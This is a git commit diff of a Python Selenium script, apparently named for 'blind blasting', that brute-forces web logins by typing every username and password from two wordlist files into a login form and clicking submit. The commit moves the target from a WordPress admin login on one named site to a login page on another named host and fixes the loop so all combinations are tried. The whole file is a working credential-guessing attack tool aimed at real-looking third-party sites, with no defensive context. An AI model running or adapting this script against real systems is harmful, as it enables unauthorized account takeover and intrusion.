73aaf6f0fac0223501db22c1d640c7a024cf360b
tianshi <1147893217@qq.com>
2019-08-26 14:30:18 +0800

    second  Encryption_blind_blasting.py

--- Encryption_blind_blasting.py
+++ Encryption_blind_blasting.py
@@ -6,28 +6,31 @@ browser = webdriver.Chrome()
 #设置浏览器窗口
 browser.set_window_size(1080,800)
 # 打开网址
-browser.get('http://www.hqjs.xyz/wp-login.php?redirect_to=http%3A%2F%2Fwww.hqjs.xyz%2Fwp-admin%2Fedit.php&reauth=1')
+browser.get('http://wms.ingeek.com:8888')
 # 定位元素输入
-while True:
-    try:
+try:
          u = open('username.txt','r',encoding='utf-8')
          f = open('password.txt','r',encoding='utf-8')
-         for username in u:
-            for password in f:
+         u1 = u.readlines()
+         f1 = f.readlines()
+         for username in u1:
+            for password in f1:
                 username = username.strip()
                 password = password.strip()
-                inputFirst = browser.find_element_by_id('user_login').send_keys(username)
-                inputFirst = browser.find_element_by_id('user_pass').send_keys(password)
+                print(username.strip()+password.strip())
+                inputFirst = browser.find_element_by_id('username').send_keys(username)
+                inputFirst = browser.find_element_by_id('password').send_keys(password)
                 # 定位元素点击
-                inputFirst = browser.find_element_by_id('wp-submit').click()
+                inputFirst = browser.find_element_by_id('login-submit').click()
                 time.sleep(1)
-                inputFirst = browser.find_element_by_id('user_login').clear()
+                inputFirst = browser.find_element_by_id('username').clear()
+
                 #登陆成功标志
                 #suCess = browser.find_element_by_id("login_error")
                 #print(suCess.text)
                 # 睡眠设置
-    except:
-        pass
+except:
+     pass
 
 
 
